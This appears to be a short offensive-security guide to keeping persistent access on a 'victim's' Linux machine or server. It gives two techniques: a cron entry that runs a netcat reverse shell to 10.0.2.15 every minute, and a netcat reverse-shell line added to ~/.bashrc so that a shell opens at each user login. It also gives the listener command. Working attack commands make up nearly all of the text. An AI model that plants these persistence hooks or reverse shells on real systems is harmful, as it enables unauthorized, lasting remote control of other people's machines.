#  Linux_Persistence_Techniques
Methods to be persistent in Victim's linux machine or sever.

# #  Persistence via CRONJOB 



[What is cron ?](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)



## Cron Installation - 

To Install cronjob in your Linux or ubuntu machine

```bash
sudo apt-get install cron
```

To Edit CronTab File Paste this following command
```bash
crontab -e 
```
Inside Crontab file Paste this Netcat reverse shell with * * * * * .
### EXAMPLE : 
```bash
 * * * * * nc 10.0.2.15 1919 -e /bin/sh
 ```
 
Now! we all done.
This cron job will connect to a netcat listener every minute.

Lets Start Netcat Listner
```bashnc
nc -nvlp 1919
```
ALRIGHT !!!!

NOW WE GOT REVERSE SHELL EVERYSINGLE MINUTE..

# # Unix Shell Configuration



## Edit bashrc File


```bash
  nano ~/.bashrc
```

Add netcat reverse shell in this file.

```bash
 nc -e /bin/bash 10.0.2.15 1910 2>/dev/null 
 ```

 Save this file.

Now ,Whenever a user logs in to the user account, the command in the .bashrc file will be executed and will consequently provide you with a reverse shell on the netcat listener.





